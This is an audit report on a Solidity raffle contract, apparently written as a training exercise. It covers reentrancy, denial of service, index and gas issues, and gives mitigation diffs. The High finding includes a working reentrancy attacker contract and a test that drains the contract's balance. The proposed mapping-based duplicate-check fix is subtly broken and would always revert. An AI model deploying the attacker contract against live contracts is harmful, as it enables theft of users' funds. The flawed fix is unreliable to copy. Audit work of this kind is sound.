# High 

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrants to drain contract for raffle balance 

**Description** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result enables participants to drain the contract balance 

In the `PuppyRaffle::refund` we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);
        
@>        players[playerIndex] = address(0);
@>        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a fallback/receive function that calls the `PuppyRaffle::refund` again and claim another refund they could continue the cycle till the contract balance is drained.

**Impact** All fees paid by raffle entrants could be stole by the malicious player 

**Proof of Concept**
1. User enters the raffle
2. Attacker set up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle 
4. Attacker calls `PuppyRaffle::refund`from their attack contract, draining the contract balance of the `PuppyRaffle`

**Proof of Code**
<details> <summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript 

 function test_reentrancyRefund() public {

        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackUser  = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);


        uint256 startingAttackBalance = address(attackerContract).balance;
        uint256 startingPuppyBalance = address(puppyRaffle).balance; 

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attack contract balance", startingAttackBalance);
        console.log("starting puppy contract balance", startingPuppyBalance);

        console.log("ending attack contract balance", address(attackerContract).balance);
        console.log("ending puppy contract balance", address(puppyRaffle).balance);


    }


```
And this contract as well 

```javascript 

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle; 
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if(address(puppyRaffle).balance >= entranceFee){
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
       _stealMoney();
    }

    receive() external payable {
       _stealMoney();
    }
}

```

</details>

**Recomended Mitigation** 

To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array first before making the external call. Additionally we should move the event emission up as well

```diff

function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
        
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }

```

# Medium

## [M-N] Looping through players array to check for duplicate in `PuppyRaffle::enterRaffle` is a potential Denial of Service attack (DoS), incrementing gas cost for future entrant 

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the  `PuppyRaffle::players` array the more checks a player will have to make. This means the gas costs for players who entered earlier will be dramatically lower than the gas cost for players who enters later. Every additional address that is pushed to the array is an additional check that has to be made by players.

**Impact:** The gas cost for raffle entrants will greatly increase as more players enters the raffle. This discourages later users and causes a rush at the start of the raffle to be early in the queue. 

An attacker might make the `PuppyRaffle::players` so big that no one else enters thereby guaranteeing them as the winner. 

**Proof Of Concept:** 

if we have two sets of 100 players the gas cost would be as such 
- 1st 100 players - 6252128
- 2nd 100 players - 18068218

This is more than 2x more expensive for the 2nd 100 players

```javascript 
// @audit DoS attack
@>   for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

<details>
<summary> Poc </summary>

Place the following test into PuppyRaffleTest.t.sol

```javascript 

    function test_denialOfService() public {

        vm.txGasPrice(1);

        uint256 playersNum = 100; 
        address[] memory players = new address[] (playersNum);

        for(uint256 i = 0; i < playersNum; i++){
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("Gas used by 200 players", gasUsedFirst);


        address[] memory playersTwo = new address[] (playersNum);

        for(uint256 i = 0; i < playersNum; i++){
            playersTwo[i] = address(i + playersNum);
        }

        uint256 gasStartSecond = gasleft();
        
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;

        console.log("Gas used by 200 players", gasUsedSecond);

        assert(gasUsedSecond > gasUsedFirst);

    }

```
</details>

**Recommended Mitigation:**

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id. 

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).


# Lows

## [L-1] `PuppyRaffle::getActibePlayerIndex` for non-existing players and player at 0 causing a player at index 0 to incorrectly think they have not entered the raffle 

**Description** If a player is at index 0 in the `PuppyRaffle::players` this will return 0, it will also return 0 if a player is not in the array 

```javascript 
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        //@audit if a player is at index 0 this will return 0 making the player think they are not active 
        return 0;
    }
```

**Impact** A player at index 0 might think they have not entered the raffle and might try to re enter the raffle again wasting gas 

**Proof of Concept** 
1. Player enter the raffle, they are the first entrant 
2. `PuppyRaffle::getActibePlayerIndex` returns 0 
3. Player thinks they have not entered the raffle due to the function documentation 

**Recommended Mitigation** The easiest recommmendation would be to revert if the player is not in the array instead of returning 0 

You could also reserve the 0th position for any competition, but a better solution might be to return `int256` where the function returns -1 if the player is not active 


# Gas

### [G-1] Unchanged state variables should be declared as immutable or constant

Reading from a storage variable is more expensive than reading from a constant  or immutable variables  

Instances
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variable in a loop should be cached 

Everytime you call `players.lenght` you read from storage as opposed to memory which is more gas efficient 

``` diff
+    uint256 playersLength = players.length 
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-               for (uint256 j = i + 1; j < players.length; j++) {
+               for (uint256 j = i + 1; j < playersLength; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }


```


# Informational

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

<details><summary>1 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

</details>

### [I-2] Using an outdated version of solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**
Deploy with a recent version of Solidity (at least `0.8.0`) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information 

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 227](src/PuppyRaffle.sol#L227)

	```solidity
	        feeAddress = newFeeAddress;
	```

### [i-4] `PupppyRaffle::selectWinner` does not follow CEI (Checks, Effects, Interacts) which is not best practice 

its best to keep code clean and follow CEI 

```diff

-    (bool success,) = winner.call{value: prizePool}("");
-    require(success, "PuppyRaffle: Failed to send prize pool to winner");
     _safeMint(winner, tokenId);
+     (bool success,) = winner.call{value: prizePool}("");
+     require(success, "PuppyRaffle: Failed to send prize pool to winner");

```

